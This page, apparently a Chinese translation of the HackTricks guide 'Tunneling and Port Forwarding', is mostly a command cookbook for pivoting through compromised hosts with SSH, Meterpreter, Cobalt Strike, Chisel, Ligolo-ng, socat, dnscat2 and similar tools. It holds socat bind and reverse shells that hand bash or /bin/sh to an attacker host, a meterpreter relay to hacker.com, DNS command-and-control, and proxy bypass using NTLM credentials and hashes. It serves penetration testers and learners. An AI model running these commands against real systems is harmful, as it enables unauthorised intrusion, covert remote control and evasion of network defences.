<!DOCTYPE HTML>
<html lang="zh" class="light sidebar-visible" dir="ltr">
    <head>
        <!-- Book generated using mdBook -->
        <meta charset="UTF-8">
        <title>Tunneling and Port Forwarding</title>


        <!-- Custom HTML head -->

        <meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="theme-color" content="#ffffff">

        <link rel="icon" href="../favicon.svg">
        <link rel="shortcut icon" href="../favicon.png">
        <link rel="stylesheet" href="../css/variables.css">
        <link rel="stylesheet" href="../css/general.css">
        <link rel="stylesheet" href="../css/chrome.css">
        <link rel="stylesheet" href="../css/print.css" media="print">

        <!-- Fonts -->
        <link rel="stylesheet" href="../FontAwesome/css/font-awesome.css">
        <link rel="stylesheet" href="../fonts/fonts.css">

        <!-- Highlight.js Stylesheets -->
        <link rel="stylesheet" href="../highlight.css">
        <link rel="stylesheet" href="../tomorrow-night.css">
        <link rel="stylesheet" href="../ayu-highlight.css">

        <!-- Custom theme stylesheets -->


        <!-- Provide site root to javascript -->
        <script>
            var path_to_root = "../";
            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
        </script>
        <!-- Start loading toc.js asap -->
        <script src="../toc.js"></script>
    </head>
    <body>
    <div id="body-container">
        <!-- Work around some values being stored in localStorage wrapped in quotes -->
        <script>
            try {
                var theme = localStorage.getItem('mdbook-theme');
                var sidebar = localStorage.getItem('mdbook-sidebar');

                if (theme.startsWith('"') && theme.endsWith('"')) {
                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
                }

                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
                }
            } catch (e) { }
        </script>

        <!-- Set the theme before any content is loaded, prevents flash -->
        <script>
            var theme;
            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
            if (theme === null || theme === undefined) { theme = default_theme; }
            const html = document.documentElement;
            html.classList.remove('light')
            html.classList.add(theme);
            html.classList.add("js");
        </script>

        <input type="checkbox" id="sidebar-toggle-anchor" class="hidden">

        <!-- Hide / unhide sidebar before it is displayed -->
        <script>
            var sidebar = null;
            var sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
            if (document.body.clientWidth >= 1080) {
                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
                sidebar = sidebar || 'visible';
            } else {
                sidebar = 'hidden';
            }
            sidebar_toggle.checked = sidebar === 'visible';
            html.classList.remove('sidebar-visible');
            html.classList.add("sidebar-" + sidebar);
        </script>

        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
            <!-- populated by js -->
            <mdbook-sidebar-scrollbox class="sidebar-scrollbox"></mdbook-sidebar-scrollbox>
            <noscript>
                <iframe class="sidebar-iframe-outer" src="../toc.html"></iframe>
            </noscript>
            <div id="sidebar-resize-handle" class="sidebar-resize-handle">
                <div class="sidebar-resize-indicator"></div>
            </div>
        </nav>

        <div id="page-wrapper" class="page-wrapper">

            <div class="page">
                <div id="menu-bar-hover-placeholder"></div>
                <div id="menu-bar" class="menu-bar sticky">
                    <div class="left-buttons">
                        <label id="sidebar-toggle" class="icon-button" for="sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
                            <i class="fa fa-bars"></i>
                        </label>
                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
                            <i class="fa fa-paint-brush"></i>
                        </button>
                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
                        </ul>
                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
                            <i class="fa fa-search"></i>
                        </button>
                    </div>

                    <h1 class="menu-title"></h1>

                    <div class="right-buttons">
                        <a href="../print.html" title="Print this book" aria-label="Print this book">
                            <i id="print-button" class="fa fa-print"></i>
                        </a>

                    </div>
                </div>

                <div id="search-wrapper" class="hidden">
                    <form id="searchbar-outer" class="searchbar-outer">
                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
                    </form>
                    <div id="searchresults-outer" class="searchresults-outer hidden">
                        <div id="searchresults-header" class="searchresults-header"></div>
                        <ul id="searchresults">
                        </ul>
                    </div>
                </div>

                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
                <script>
                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
                    });
                </script>

                <div id="content" class="content">
                    <main>
                        <h1 id="隧道和端口转发"><a class="header" href="#隧道和端口转发">隧道和端口转发</a></h1>
<p>{% hint style="success" %}
学习和实践 AWS 黑客技术：<img src="../.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks 培训 AWS 红队专家 (ARTE)</strong></a><img src="../.gitbook/assets/arte.png" alt="" data-size="line"><br />
学习和实践 GCP 黑客技术：<img src="../.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks 培训 GCP 红队专家 (GRTE)</strong><img src="../.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
<details>
<summary>支持 HackTricks</summary>
<ul>
<li>查看 <a href="https://github.com/sponsors/carlospolop"><strong>订阅计划</strong></a>!</li>
<li><strong>加入</strong> 💬 <a href="https://discord.gg/hRep4RUj7f"><strong>Discord 群组</strong></a> 或 <a href="https://t.me/peass"><strong>Telegram 群组</strong></a> 或 <strong>关注</strong> 我们的 <strong>Twitter</strong> 🐦 <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
<li><strong>通过向</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> 和 <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> GitHub 仓库提交 PR 分享黑客技巧。</li>
</ul>
</details>
{% endhint %}
<h2 id="nmap-提示"><a class="header" href="#nmap-提示">Nmap 提示</a></h2>
<p>{% hint style="warning" %}
<strong>ICMP</strong> 和 <strong>SYN</strong> 扫描无法通过 socks 代理进行隧道传输，因此我们必须 <strong>禁用 ping 探测</strong> (<code>-Pn</code>) 并指定 <strong>TCP 扫描</strong> (<code>-sT</code>) 以使其工作。
{% endhint %}</p>
<h2 id="bash"><a class="header" href="#bash"><strong>Bash</strong></a></h2>
<p><strong>主机 -&gt; 跳转 -&gt; 内部A -&gt; 内部B</strong></p>
<pre><code class="language-bash"># On the jump server connect the port 3333 to the 5985
mknod backpipe p;
nc -lvnp 5985 0&lt;backpipe | nc -lvnp 3333 1&gt;backpipe

# On InternalA accessible from Jump and can access InternalB
## Expose port 3333 and connect it to the winrm port of InternalB
exec 3&lt;&gt;/dev/tcp/internalB/5985
exec 4&lt;&gt;/dev/tcp/Jump/3333
cat &lt;&amp;3 &gt;&amp;4 &amp;
cat &lt;&amp;4 &gt;&amp;3 &amp;

# From the host, you can now access InternalB from the Jump server
evil-winrm -u username -i Jump
</code></pre>
<h2 id="ssh"><a class="header" href="#ssh"><strong>SSH</strong></a></h2>
<p>SSH 图形连接 (X)</p>
<pre><code class="language-bash">ssh -Y -C &lt;user&gt;@&lt;ip&gt; #-Y is less secure but faster than -X
</code></pre>
<h3 id="local-port2port"><a class="header" href="#local-port2port">Local Port2Port</a></h3>
<p>在SSH服务器中打开新端口 --&gt; 其他端口</p>
<pre><code class="language-bash">ssh -R 0.0.0.0:10521:127.0.0.1:1521 user@10.0.0.1 #Local port 1521 accessible in port 10521 from everywhere
</code></pre>
<pre><code class="language-bash">ssh -R 0.0.0.0:10521:10.0.0.1:1521 user@10.0.0.1 #Remote port 1521 accessible in port 10521 from everywhere
</code></pre>
<h3 id="port2port"><a class="header" href="#port2port">Port2Port</a></h3>
<p>本地端口 --&gt; 被攻陷的主机 (SSH) --&gt; 第三方_盒子:端口</p>
<pre><code class="language-bash">ssh -i ssh_key &lt;user&gt;@&lt;ip_compromised&gt; -L &lt;attacker_port&gt;:&lt;ip_victim&gt;:&lt;remote_port&gt; [-p &lt;ssh_port&gt;] [-N -f]  #This way the terminal is still in your host
#Example
sudo ssh -L 631:&lt;ip_victim&gt;:631 -N -f -l &lt;username&gt; &lt;ip_compromised&gt;
</code></pre>
<h3 id="port2hostnet-proxychains"><a class="header" href="#port2hostnet-proxychains">Port2hostnet (proxychains)</a></h3>
<p>本地端口 --&gt; 被攻陷的主机 (SSH) --&gt; 任何地方</p>
<pre><code class="language-bash">ssh -f -N -D &lt;attacker_port&gt; &lt;username&gt;@&lt;ip_compromised&gt; #All sent to local port will exit through the compromised server (use as proxy)
</code></pre>
<h3 id="反向端口转发"><a class="header" href="#反向端口转发">反向端口转发</a></h3>
<p>这对于通过 DMZ 从内部主机获取反向 shell 到您的主机非常有用：</p>
<pre><code class="language-bash">ssh -i dmz_key -R &lt;dmz_internal_ip&gt;:443:0.0.0.0:7000 root@10.129.203.111 -vN
# Now you can send a rev to dmz_internal_ip:443 and capture it in localhost:7000
# Note that port 443 must be open
# Also, remmeber to edit the /etc/ssh/sshd_config file on Ubuntu systems
# and change the line "GatewayPorts no" to "GatewayPorts yes"
# to be able to make ssh listen in non internal interfaces in the victim (443 in this case)
</code></pre>
<h3 id="vpn-tunnel"><a class="header" href="#vpn-tunnel">VPN-Tunnel</a></h3>
<p>您需要<strong>在两个设备上具有root权限</strong>（因为您将创建新的接口），并且sshd配置必须允许root登录：<br />
<code>PermitRootLogin yes</code><br />
<code>PermitTunnel yes</code></p>
<pre><code class="language-bash">ssh root@server -w any:any #This will create Tun interfaces in both devices
ip addr add 1.1.1.2/32 peer 1.1.1.1 dev tun0 #Client side VPN IP
ifconfig tun0 up #Activate the client side network interface
ip addr add 1.1.1.1/32 peer 1.1.1.2 dev tun0 #Server side VPN IP
ifconfig tun0 up #Activate the server side network interface
</code></pre>
<p>在服务器端启用转发</p>
<pre><code class="language-bash">echo 1 &gt; /proc/sys/net/ipv4/ip_forward
iptables -t nat -A POSTROUTING -s 1.1.1.2 -o eth0 -j MASQUERADE
</code></pre>
<p>在客户端设置新路由</p>
<pre><code>route add -net 10.0.0.0/16 gw 1.1.1.1
</code></pre>
<h2 id="sshuttle"><a class="header" href="#sshuttle">SSHUTTLE</a></h2>
<p>您可以通过 <strong>ssh</strong> 将所有 <strong>流量</strong> 通过主机 <strong>隧道</strong> 到 <strong>子网络</strong>。<br />
例如，转发所有发送到 10.10.10.0/24 的流量。</p>
<pre><code class="language-bash">pip install sshuttle
sshuttle -r user@host 10.10.10.10/24
</code></pre>
<p>使用私钥连接</p>
<pre><code class="language-bash">sshuttle -D -r user@host 10.10.10.10 0/0 --ssh-cmd 'ssh -i ./id_rsa'
# -D : Daemon mode
</code></pre>
<h2 id="meterpreter"><a class="header" href="#meterpreter">Meterpreter</a></h2>
<h3 id="port2port-1"><a class="header" href="#port2port-1">Port2Port</a></h3>
<p>本地端口 --&gt; 被攻陷的主机（活动会话） --&gt; 第三方_盒子:端口</p>
<pre><code class="language-bash"># Inside a meterpreter session
portfwd add -l &lt;attacker_port&gt; -p &lt;Remote_port&gt; -r &lt;Remote_host&gt;
</code></pre>
<h3 id="socks"><a class="header" href="#socks">SOCKS</a></h3>
<pre><code class="language-bash">background# meterpreter session
route add &lt;IP_victim&gt; &lt;Netmask&gt; &lt;Session&gt; # (ex: route add 10.10.10.14 255.255.255.0 8)
use auxiliary/server/socks_proxy
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" &gt; /etc/proxychains.conf #Proxychains
</code></pre>
<p>另一种方法：</p>
<pre><code class="language-bash">background #meterpreter session
use post/multi/manage/autoroute
set SESSION &lt;session_n&gt;
set SUBNET &lt;New_net_ip&gt; #Ex: set SUBNET 10.1.13.0
set NETMASK &lt;Netmask&gt;
run
use auxiliary/server/socks_proxy
set VERSION 4a
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" &gt; /etc/proxychains.conf #Proxychains
</code></pre>
<h2 id="cobalt-strike"><a class="header" href="#cobalt-strike">Cobalt Strike</a></h2>
<h3 id="socks-代理"><a class="header" href="#socks-代理">SOCKS 代理</a></h3>
<p>在 teamserver 中打开一个端口，监听所有接口，以便可以用来 <strong>通过 beacon 路由流量</strong>。</p>
<pre><code class="language-bash">beacon&gt; socks 1080
[+] started SOCKS4a server on: 1080

# Set port 1080 as proxy server in proxychains.conf
proxychains nmap -n -Pn -sT -p445,3389,5985 10.10.17.25
</code></pre>
<h3 id="rport2port"><a class="header" href="#rport2port">rPort2Port</a></h3>
<p>{% hint style="warning" %}
在这种情况下，<strong>端口在信标主机上打开</strong>，而不是在团队服务器上，流量被发送到团队服务器，然后从那里发送到指定的主机:端口
{% endhint %}</p>
<pre><code class="language-bash">rportfwd [bind port] [forward host] [forward port]
rportfwd stop [bind port]
</code></pre>
<p>To note:</p>
<ul>
<li>Beacon的反向端口转发旨在<strong>将流量隧道到团队服务器，而不是在单个机器之间中继</strong>。</li>
<li>流量是<strong>在Beacon的C2流量中隧道化</strong>，包括P2P链接。</li>
<li><strong>不需要管理员权限</strong>来在高端口上创建反向端口转发。</li>
</ul>
<h3 id="rport2port-local"><a class="header" href="#rport2port-local">rPort2Port local</a></h3>
<p>{% hint style="warning" %}
在这种情况下，<strong>端口在beacon主机上打开</strong>，而不是在团队服务器上，<strong>流量发送到Cobalt Strike客户端</strong>（而不是团队服务器），然后从那里发送到指定的主机:端口
{% endhint %}</p>
<pre><code>rportfwd_local [bind port] [forward host] [forward port]
rportfwd_local stop [bind port]
</code></pre>
<h2 id="regeorg"><a class="header" href="#regeorg">reGeorg</a></h2>
<p><a href="https://github.com/sensepost/reGeorg">https://github.com/sensepost/reGeorg</a></p>
<p>您需要上传一个网络文件隧道：ashx|aspx|js|jsp|php|php|jsp</p>
<pre><code class="language-bash">python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/tunnel.jsp
</code></pre>
<h2 id="chisel"><a class="header" href="#chisel">Chisel</a></h2>
<p>您可以从 <a href="https://github.com/jpillora/chisel">https://github.com/jpillora/chisel</a> 的发布页面下载它。<br />
您需要为客户端和服务器使用 <strong>相同版本</strong></p>
<h3 id="socks-1"><a class="header" href="#socks-1">socks</a></h3>
<pre><code class="language-bash">./chisel server -p 8080 --reverse #Server -- Attacker
./chisel-x64.exe client 10.10.14.3:8080 R:socks #Client -- Victim
#And now you can use proxychains with port 1080 (default)

./chisel server -v -p 8080 --socks5 #Server -- Victim (needs to have port 8080 exposed)
./chisel client -v 10.10.10.10:8080 socks #Attacker
</code></pre>
<h3 id="端口转发"><a class="header" href="#端口转发">端口转发</a></h3>
<pre><code class="language-bash">./chisel_1.7.6_linux_amd64 server -p 12312 --reverse #Server -- Attacker
./chisel_1.7.6_linux_amd64 client 10.10.14.20:12312 R:4505:127.0.0.1:4505 #Client -- Victim
</code></pre>
<h2 id="ligolo-ng"><a class="header" href="#ligolo-ng">Ligolo-ng</a></h2>
<p><a href="https://github.com/nicocha30/ligolo-ng">https://github.com/nicocha30/ligolo-ng</a></p>
<p><strong>代理和代理使用相同版本</strong></p>
<h3 id="隧道技术"><a class="header" href="#隧道技术">隧道技术</a></h3>
<pre><code class="language-bash"># Start proxy server and automatically generate self-signed TLS certificates -- Attacker
sudo ./proxy -selfcert
# Create an interface named "ligolo" -- Attacker
interface_create --name "ligolo"
# Print the currently used certificate fingerprint -- Attacker
certificate_fingerprint
# Start the agent with certification validation -- Victim
./agent -connect &lt;ip_proxy&gt;:11601 -v -accept-fingerprint &lt;fingerprint&gt;
# Select the agent -- Attacker
session
1
# Start the tunnel on the proxy server -- Attacker
tunnel_start --tun "ligolo"
# Display the agent's network configuration -- Attacker
ifconfig
# Create a route to the agent's specified network -- Attacker
interface_add_route --name "ligolo" --route &lt;network_address_agent&gt;/&lt;netmask_agent&gt;
# Display the tun interfaces -- Attacker
interface_list
</code></pre>
<h3 id="代理绑定和监听"><a class="header" href="#代理绑定和监听">代理绑定和监听</a></h3>
<pre><code class="language-bash"># Establish a tunnel from the proxy server to the agent
# Create a TCP listening socket on the agent (0.0.0.0) on port 30000 and forward incoming TCP connections to the proxy (127.0.0.1) on port 10000 -- Attacker
listener_add --addr 0.0.0.0:30000 --to 127.0.0.1:10000 --tcp
# Display the currently running listeners on the agent -- Attacker
listener_list
</code></pre>
<h3 id="访问代理的本地端口"><a class="header" href="#访问代理的本地端口">访问代理的本地端口</a></h3>
<pre><code class="language-bash"># Establish a tunnel from the proxy server to the agent
# Create a route to redirect traffic for 240.0.0.1 to the Ligolo-ng interface to access the agent's local services -- Attacker
interface_add_route --name "ligolo" --route 240.0.0.1/32
</code></pre>
<h2 id="rpivot"><a class="header" href="#rpivot">Rpivot</a></h2>
<p><a href="https://github.com/klsecservices/rpivot">https://github.com/klsecservices/rpivot</a></p>
<p>反向隧道。隧道从受害者开始。<br />
在 127.0.0.1:1080 上创建一个 socks4 代理。</p>
<pre><code class="language-bash">attacker&gt; python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port 1080
</code></pre>
<pre><code class="language-bash">victim&gt; python client.py --server-ip &lt;rpivot_server_ip&gt; --server-port 9999
</code></pre>
<p>通过 <strong>NTLM 代理</strong> 进行枢转</p>
<pre><code class="language-bash">victim&gt; python client.py --server-ip &lt;rpivot_server_ip&gt; --server-port 9999 --ntlm-proxy-ip &lt;proxy_ip&gt; --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --password P@ssw0rd
</code></pre>
<pre><code class="language-bash">victim&gt; python client.py --server-ip &lt;rpivot_server_ip&gt; --server-port 9999 --ntlm-proxy-ip &lt;proxy_ip&gt; --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --hashes 9b9850751be2515c8231e5189015bbe6:49ef7638d69a01f26d96ed673bf50c45
</code></pre>
<h2 id="socat"><a class="header" href="#socat"><strong>Socat</strong></a></h2>
<p><a href="https://github.com/andrew-d/static-binaries">https://github.com/andrew-d/static-binaries</a></p>
<h3 id="绑定-shell"><a class="header" href="#绑定-shell">绑定 shell</a></h3>
<pre><code class="language-bash">victim&gt; socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
attacker&gt; socat FILE:`tty`,raw,echo=0 TCP4:&lt;victim_ip&gt;:1337
</code></pre>
<h3 id="反向-shell"><a class="header" href="#反向-shell">反向 shell</a></h3>
<pre><code class="language-bash">attacker&gt; socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
victim&gt; socat TCP4:&lt;attackers_ip&gt;:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
</code></pre>
<h3 id="port2port-2"><a class="header" href="#port2port-2">Port2Port</a></h3>
<pre><code class="language-bash">socat TCP4-LISTEN:&lt;lport&gt;,fork TCP4:&lt;redirect_ip&gt;:&lt;rport&gt; &amp;
</code></pre>
<h3 id="通过socks的port2port"><a class="header" href="#通过socks的port2port">通过socks的Port2Port</a></h3>
<pre><code class="language-bash">socat TCP4-LISTEN:1234,fork SOCKS4A:127.0.0.1:google.com:80,socksport=5678
</code></pre>
<h3 id="通过-ssl-socat-的-meterpreter"><a class="header" href="#通过-ssl-socat-的-meterpreter">通过 SSL Socat 的 Meterpreter</a></h3>
<pre><code class="language-bash">#Create meterpreter backdoor to port 3333 and start msfconsole listener in that port
attacker&gt; socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,fork,verify=1 TCP:127.0.0.1:3333
</code></pre>
<pre><code class="language-bash">victim&gt; socat.exe TCP-LISTEN:2222 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|TCP:hacker.com:443,connect-timeout=5
#Execute the meterpreter
</code></pre>
<p>您可以通过在受害者的控制台中执行这一行来绕过<strong>非认证代理</strong>：</p>
<pre><code class="language-bash">OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacker.com:443,connect-timeout=5|TCP:proxy.lan:8080,connect-timeout=5
</code></pre>
<h3 id="ssl-socat-tunnel"><a class="header" href="#ssl-socat-tunnel">SSL Socat Tunnel</a></h3>
<p><strong>/bin/sh 控制台</strong></p>
<p>在客户端和服务器两侧创建证书：</p>
<pre><code class="language-bash"># Execute these commands on both sides
FILENAME=socatssl
openssl genrsa -out $FILENAME.key 1024
openssl req -new -key $FILENAME.key -x509 -days 3653 -out $FILENAME.crt
cat $FILENAME.key $FILENAME.crt &gt;$FILENAME.pem
chmod 600 $FILENAME.key $FILENAME.pem
</code></pre>
<pre><code class="language-bash">attacker-listener&gt; socat OPENSSL-LISTEN:433,reuseaddr,cert=server.pem,cafile=client.crt EXEC:/bin/sh
victim&gt; socat STDIO OPENSSL-CONNECT:localhost:433,cert=client.pem,cafile=server.crt
</code></pre>
<h3 id="remote-port2port"><a class="header" href="#remote-port2port">Remote Port2Port</a></h3>
<p>将本地 SSH 端口 (22) 连接到攻击者主机的 443 端口</p>
<pre><code class="language-bash">attacker&gt; sudo socat TCP4-LISTEN:443,reuseaddr,fork TCP4-LISTEN:2222,reuseaddr #Redirect port 2222 to port 443 in localhost
victim&gt; while true; do socat TCP4:&lt;attacker&gt;:443 TCP4:127.0.0.1:22 ; done # Establish connection with the port 443 of the attacker and everything that comes from here is redirected to port 22
attacker&gt; ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh of the victim
</code></pre>
<h2 id="plinkexe"><a class="header" href="#plinkexe">Plink.exe</a></h2>
<p>它就像一个控制台版本的PuTTY（选项与ssh客户端非常相似）。</p>
<p>由于这个二进制文件将在受害者的机器上执行，并且它是一个ssh客户端，我们需要打开我们的ssh服务和端口，以便能够建立反向连接。然后，将仅本地可访问的端口转发到我们机器上的一个端口：</p>
<pre><code class="language-bash">echo y | plink.exe -l &lt;Our_valid_username&gt; -pw &lt;valid_password&gt; [-p &lt;port&gt;] -R &lt;port_ in_our_host&gt;:&lt;next_ip&gt;:&lt;final_port&gt; &lt;your_ip&gt;
echo y | plink.exe -l root -pw password [-p 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
</code></pre>
<h2 id="windows-netsh"><a class="header" href="#windows-netsh">Windows netsh</a></h2>
<h3 id="port2port-3"><a class="header" href="#port2port-3">Port2Port</a></h3>
<p>您需要是本地管理员（对于任何端口）</p>
<pre><code class="language-bash">netsh interface portproxy add v4tov4 listenaddress= listenport= connectaddress= connectport= protocol=tcp
# Example:
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=4444 connectaddress=10.10.10.10 connectport=4444
# Check the port forward was created:
netsh interface portproxy show v4tov4
# Delete port forward
netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
</code></pre>
<h2 id="socksoverrdp--proxifier"><a class="header" href="#socksoverrdp--proxifier">SocksOverRDP &amp; Proxifier</a></h2>
<p>您需要拥有<strong>系统的RDP访问权限</strong>。<br />
下载：</p>
<ol>
<li><a href="https://github.com/nccgroup/SocksOverRDP/releases">SocksOverRDP x64 Binaries</a> - 该工具使用Windows的远程桌面服务功能中的<code>Dynamic Virtual Channels</code>（<code>DVC</code>）。DVC负责<strong>在RDP连接上隧道数据包</strong>。</li>
<li><a href="https://www.proxifier.com/download/#win-tab">Proxifier Portable Binary</a></li>
</ol>
<p>在您的客户端计算机上加载**<code>SocksOverRDP-Plugin.dll</code>**，如下所示：</p>
<pre><code class="language-bash"># Load SocksOverRDP.dll using regsvr32.exe
C:\SocksOverRDP-x64&gt; regsvr32.exe SocksOverRDP-Plugin.dll
</code></pre>
<p>现在我们可以通过 <strong>RDP</strong> 使用 <strong><code>mstsc.exe</code></strong> 连接到 <strong>受害者</strong>，我们应该收到一个 <strong>提示</strong>，说明 <strong>SocksOverRDP 插件已启用</strong>，并且它将 <strong>监听</strong> 在 <strong>127.0.0.1:1080</strong>。</p>
<p>通过 <strong>RDP</strong> 连接并在受害者机器上上传并执行 <code>SocksOverRDP-Server.exe</code> 二进制文件：</p>
<pre><code>C:\SocksOverRDP-x64&gt; SocksOverRDP-Server.exe
</code></pre>
<p>现在，在你的机器（攻击者）上确认端口 1080 正在监听：</p>
<pre><code>netstat -antb | findstr 1080
</code></pre>
<p>现在您可以使用 <a href="https://www.proxifier.com/"><strong>Proxifier</strong></a> <strong>通过该端口代理流量。</strong></p>
<h2 id="代理-windows-gui-应用程序"><a class="header" href="#代理-windows-gui-应用程序">代理 Windows GUI 应用程序</a></h2>
<p>您可以使用 <a href="https://www.proxifier.com/"><strong>Proxifier</strong></a> 使 Windows GUI 应用程序通过代理进行导航。<br />
在 <strong>Profile -&gt; Proxy Servers</strong> 中添加 SOCKS 服务器的 IP 和端口。<br />
在 <strong>Profile -&gt; Proxification Rules</strong> 中添加要代理的程序名称和要代理的 IP 的连接。</p>
<h2 id="ntlm-代理绕过"><a class="header" href="#ntlm-代理绕过">NTLM 代理绕过</a></h2>
<p>之前提到的工具：<strong>Rpivot</strong><br />
<strong>OpenVPN</strong> 也可以绕过它，在配置文件中设置这些选项：</p>
<pre><code class="language-bash">http-proxy &lt;proxy_ip&gt; 8080 &lt;file_with_creds&gt; ntlm
</code></pre>
<h3 id="cntlm"><a class="header" href="#cntlm">Cntlm</a></h3>
<p><a href="http://cntlm.sourceforge.net/">http://cntlm.sourceforge.net/</a></p>
<p>它对代理进行身份验证，并在本地绑定一个端口，该端口转发到您指定的外部服务。然后，您可以通过此端口使用您选择的工具。<br />
例如，转发端口 443</p>
<pre><code>Username Alice
Password P@ssw0rd
Domain CONTOSO.COM
Proxy 10.0.0.10:8080
Tunnel 2222:&lt;attackers_machine&gt;:443
</code></pre>
<p>现在，如果你在受害者的<strong>SSH</strong>服务上设置监听端口为443。你可以通过攻击者的2222端口连接到它。<br />
你也可以使用一个连接到localhost:443的<strong>meterpreter</strong>，攻击者在2222端口监听。</p>
<h2 id="yarp"><a class="header" href="#yarp">YARP</a></h2>
<p>由微软创建的反向代理。你可以在这里找到它: <a href="https://github.com/microsoft/reverse-proxy">https://github.com/microsoft/reverse-proxy</a></p>
<h2 id="dns-tunneling"><a class="header" href="#dns-tunneling">DNS Tunneling</a></h2>
<h3 id="iodine"><a class="header" href="#iodine">Iodine</a></h3>
<p><a href="https://code.kryo.se/iodine/">https://code.kryo.se/iodine/</a></p>
<p>在两个系统中都需要root权限，以创建tun适配器并通过DNS查询在它们之间隧道数据。</p>
<pre><code>attacker&gt; iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com
victim&gt; iodine -f -P P@ssw0rd tunneldomain.com -r
#You can see the victim at 1.1.1.2
</code></pre>
<p>隧道将会非常慢。您可以通过使用以下命令在此隧道中创建一个压缩的SSH连接：</p>
<pre><code>ssh &lt;user&gt;@1.1.1.2 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080
</code></pre>
<h3 id="dnscat2"><a class="header" href="#dnscat2">DNSCat2</a></h3>
<p><a href="https://github.com/iagox86/dnscat2"><strong>从这里下载</strong></a><strong>.</strong></p>
<p>通过DNS建立C&amp;C通道。它不需要root权限。</p>
<pre><code class="language-bash">attacker&gt; ruby ./dnscat2.rb tunneldomain.com
victim&gt; ./dnscat2 tunneldomain.com

# If using it in an internal network for a CTF:
attacker&gt; ruby dnscat2.rb --dns host=10.10.10.10,port=53,domain=mydomain.local --no-cache
victim&gt; ./dnscat2 --dns host=10.10.10.10,port=5353
</code></pre>
<h4 id="在-powershell-中"><a class="header" href="#在-powershell-中"><strong>在 PowerShell 中</strong></a></h4>
<p>您可以使用 <a href="https://github.com/lukebaggett/dnscat2-powershell"><strong>dnscat2-powershell</strong></a> 在 PowerShell 中运行 dnscat2 客户端：</p>
<pre><code>Import-Module .\dnscat2.ps1
Start-Dnscat2 -DNSserver 10.10.10.10 -Domain mydomain.local -PreSharedSecret somesecret -Exec cmd
</code></pre>
<h4 id="使用-dnscat-进行端口转发"><a class="header" href="#使用-dnscat-进行端口转发"><strong>使用 dnscat 进行端口转发</strong></a></h4>
<pre><code class="language-bash">session -i &lt;sessions_id&gt;
listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this bind 8080port in attacker host
</code></pre>
<h4 id="更改-proxychains-dns"><a class="header" href="#更改-proxychains-dns">更改 proxychains DNS</a></h4>
<p>Proxychains 拦截 <code>gethostbyname</code> libc 调用，并通过 socks 代理隧道 tcp DNS 请求。默认情况下，proxychains 使用的 DNS 服务器是 <strong>4.2.2.2</strong>（硬编码）。要更改它，请编辑文件：<em>/usr/lib/proxychains3/proxyresolv</em> 并更改 IP。如果您在 <strong>Windows 环境</strong> 中，可以设置 <strong>域控制器</strong> 的 IP。</p>
<h2 id="go-中的隧道"><a class="header" href="#go-中的隧道">Go 中的隧道</a></h2>
<p><a href="https://github.com/hotnops/gtunnel">https://github.com/hotnops/gtunnel</a></p>
<h2 id="icmp-隧道"><a class="header" href="#icmp-隧道">ICMP 隧道</a></h2>
